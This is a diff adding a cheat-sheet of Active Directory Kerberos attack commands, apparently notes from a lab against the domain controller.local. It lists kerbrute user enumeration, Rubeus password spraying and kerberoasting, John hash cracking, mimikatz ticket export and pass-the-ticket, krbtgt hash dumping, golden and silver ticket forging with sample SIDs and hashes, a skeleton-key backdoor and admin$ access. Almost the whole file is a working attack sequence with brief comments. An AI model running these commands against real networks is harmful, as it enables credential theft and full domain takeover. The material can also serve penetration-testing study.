@@ -1,0 +1,44 @@
+# enumerating users with kerbrute
+./kerbrute_linux_amd64 userenum -dc <ip-address> -d controller.local user.txt
+.\rubeus.exe harvest /interval:30
+# this will take a password & spray it against all the users and issues a .kirbi ticket TGT for that user which is found to be a valid user 
+.\rubeus.exe brute /password:Password1 /noticket
+
+#this will dump the kerberos hash of any kerberostable users
+.\Rubeus.exe kerberoast
+john --wordlist=./Pass.txt --format=krb5asrep asperoast_hashes.txt
+
+# prepare mimikatz and dump tickets
+mimikatz.exe
+privilege::debug
+# exports all .kirbi tickets into the directory you are currently in.
+sekurlsa::tickets /export
+# choose a ticket & pass the ticket - this will cache and impersonate the given ticket
+
+kerberos::ptt <kirbi ticket>
+kerberos::ptt [0;2b2cc0]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+#
+#* File: '[0;2b2cc0]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
+#
+klist
+
+# dump the hash and security identifier needed for creating a golden ticket
+# in-order for you to change the /name to dump either a domain admin account or a service account such as SQLService account
+
+lsadump::lsa /inject /name:krbtgt
+lsadump::lsa /inject /name:Administrator
+lsadump::lsa /inject /name:sqlservice
+
+# creating a silver or golden ticket
+Kerberos::golden /user:Administrator /domain:controller.local /sid:<security id> /krbtgt:<hash> /id:<user-id>
+Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502
+
+Kerberos::golden /user:sqlservice /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1109
+
+# Use the golden/silver ticket to access other machines
+# this will open a new elevated command prompt with given ticket in mimikatz
+misc::cmd
+misc::skeleton
+
+net use c:\\controller.local\admin$ /user:Administrator mimikatz
+
